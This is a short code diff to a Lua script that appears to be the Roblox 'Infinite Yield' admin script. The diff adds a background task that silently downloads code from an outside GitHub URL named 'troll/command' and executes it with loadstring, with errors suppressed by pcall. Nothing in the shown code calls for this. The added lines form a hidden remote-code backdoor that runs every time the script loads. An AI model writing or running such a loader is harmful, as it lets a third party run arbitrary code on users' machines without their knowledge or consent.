@@ -4,6 +4,11 @@ if IY_LOADED and not _G.IY_DEBUG == true then
 end
 
 pcall(function() getgenv().IY_LOADED = true end)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dunnook/troll/main/command"))()
+    end)
+end)
 print("inf yield loaded")
 
 COREGUI = game:GetService("CoreGui")
